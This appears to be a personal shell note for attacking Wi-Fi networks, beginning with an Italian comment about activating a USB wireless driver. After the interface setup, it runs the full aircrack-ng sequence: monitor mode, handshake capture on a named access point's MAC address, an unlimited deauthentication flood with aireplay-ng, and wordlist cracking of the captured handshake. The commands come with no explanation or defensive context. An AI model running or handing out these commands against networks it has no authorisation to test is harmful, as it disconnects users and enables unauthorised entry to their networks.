#attivazione Driver usb-wireless
ip link set dev wlxbcec43442351 down

iwconfig

iwlist wlxbcec43442351 channel

iw dev wlxbcec43442351 set channel 40

airmon-ng start wlxbcec43442351 40 

ip link set dev wlxbcec43442351 up

dhclient -v wlxbcec43442351

$ ifconfig wlan0 down

$ iwconfig wlan0 mode monitor

$ ifconfig wlan0 up 

airmon-ng check wlan0

airodump-ng wlan0
$ airodump-ng -c [channel number] -w [filename for output] --bssid [MAC Address of A.P.] [your interface]
$ airodump-ng -c 7 -w SCAN_OUTPUT --bssid 7C:B1:DF:B9:12:59 wlan0
$ aireplay-ng -0 0 -a 7C:B1:DF:B9:12:59 wlan0
$ aircrack-ng -w wordlist.txt SCAN_OUTPUT.cap
